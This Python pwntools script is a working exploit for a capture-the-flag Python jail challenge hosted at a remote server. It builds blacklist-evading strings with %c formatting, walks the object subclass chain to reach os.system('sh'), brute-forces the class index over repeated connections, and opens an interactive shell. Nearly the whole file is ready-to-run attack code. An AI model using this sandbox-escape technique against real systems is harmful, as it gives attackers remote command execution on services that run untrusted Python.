#!/usr/bin/env python3
# Filename: exploit.py
# Description: Automates the Python jailbreak for the scriptsorcerers challenge.
#              It generates the payload, connects, sends it, and provides a shell.
#              This version automatically brute-forces the class index.

from pwn import *

def make_str(s):
    """
    Converts a string like '__class__' into a Python expression
    that bypasses the jail's character blacklist.
    
    Example: 'os' -> "'%c%c'%(111, 115)"
    """
    # Create a format string, e.g., '%c%c%c'
    formatter = f"'%{'%'.join(['c'] * len(s))}'"
    
    # Create the tuple of ASCII values
    # A special case is needed for single-character strings to form a valid tuple: (111,)
    if len(s) == 1:
        codes = f"({ord(s[0])},)"
    else:
        codes = str(tuple(ord(c) for c in s))
        
    return f"{formatter}%{codes}"

# --- 1. Payload Generation ---
# We construct the strings needed for the exploit using our helper function.
# This avoids using any blacklisted characters directly in the payload.
log.info("Generating payload strings...")
s_class      = make_str('__class__')
s_bases      = make_str('__bases__')
s_getitem    = make_str('__getitem__')
s_subclasses = make_str('__subclasses__')
s_init       = make_str('__init__')
s_globals    = make_str('__globals__')
s_builtins   = make_str('__builtins__')
s_import     = make_str('__import__')
s_os         = make_str('os')
s_system     = make_str('system')
s_sh         = make_str('sh')

# --- 2. Connection and Brute-force ---
# Set up the connection details
HOST = 'play.scriptsorcerers.xyz'
PORT = 10489

# We will loop through a wider range of possible class indexes because the exact
# index can vary between environments. 50-500 should be more than enough.
for i in range(50, 500):
    class_index = i
    log.info(f"Attempting to exploit with class index: {class_index}")
    
    # Assemble the payload for the current index
    payload = f"c(c({s_getitem})(c({s_getitem})(c(c(c(c(c((),{s_class}),{s_bases}),{s_getitem})(0),{s_subclasses})(),{class_index}),{s_init}),{s_globals}),{s_builtins}),{s_import})({s_os}),{s_system})({s_sh})"

    try:
        # Connect to the server. Log level 'error' keeps the output clean during the loop.
        p = remote(HOST, PORT, level='error')
        
        # Wait for prompt and send the payload
        p.recvuntil(b'Enter payload: ')
        p.sendline(payload.encode())
        
        # Send a test command to see if we have a shell. If the payload failed,
        # the connection will close and this will raise an EOFError.
        p.sendline(b'echo PWNED_SUCCESS')
        
        # Check for the response. If we get our echo back, we succeeded.
        # The timeout is crucial to prevent hanging if the shell is not responsive.
        response = p.recvuntil(b'PWNED_SUCCESS', timeout=1)
        
        if b'PWNED_SUCCESS' in response:
            log.success(f"Success! Found correct class index: {class_index}")
            log.info("Switching to interactive mode...")
            p.interactive()
            # If the user exits the interactive shell, we can exit the script.
            exit(0)
        else:
            # If we didn't get the echo back, the payload likely failed.
            log.warning(f"Index {class_index} failed. Connection closed gracefully.")
            p.close()

    except EOFError:
        # This is the expected failure mode if the index is wrong and the server hangs up.
        log.warning(f"Index {class_index} failed (Got EOF).")
        if 'p' in locals() and p.connected():
            p.close()
    except Exception as e:
        log.error(f"An unexpected error occurred with index {class_index}: {e}")
        if 'p' in locals() and p.connected():
            p.close()

log.error("Failed to find a suitable class index in the specified range.")
